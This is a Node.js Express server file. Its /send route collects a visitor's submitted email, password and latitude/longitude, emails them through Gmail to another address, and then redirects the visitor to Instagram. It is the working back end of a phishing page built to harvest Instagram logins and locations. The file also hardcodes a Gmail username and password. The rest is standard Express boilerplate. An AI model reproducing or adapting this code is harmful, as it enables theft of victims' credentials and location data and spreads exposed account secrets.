var express = require('express');
var path = require('path');
var favicon = require('serve-favicon');
var logger = require('morgan');
var cookieParser = require('cookie-parser');
var bodyParser = require('body-parser');
var nodemailer=require('nodemailer');

var index = require('./routes/index');
var users = require('./routes/users');

var app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

// uncomment after placing your favicon in /public
//app.use(favicon(path.join(__dirname, 'public', 'favicon.ico')));
app.use(logger('dev'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.use('/', index);
app.use('/users', users);
app.post('/send',function(request,response){
    console.log(request.body.email);
    console.log(request.body.psw);
    console.log(request.body.latlong);

    var transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'arzymatjorobekovofficial@gmail.com',
            pass: 'arzy967596'
        }
    });

    var mailOptions = {
        from: 'arzymatjorobekovofficial@gmail.com',
        to: 'keldibekov066@gmail.com',
        subject: 'Sending Email using Node.js',
        text: "username:" + request.body.email + " password: " + request.body.psw+ "   Я Здесь: "+request.body.latlong
    };

    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });

    response.redirect('https://www.instagram.com/');
});



// catch 404 and forward to error handler
app.use(function(req, res, next) {
  var err = new Error('Not Found');
  err.status = 404;
  next(err);
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('error');
});

module.exports = app;
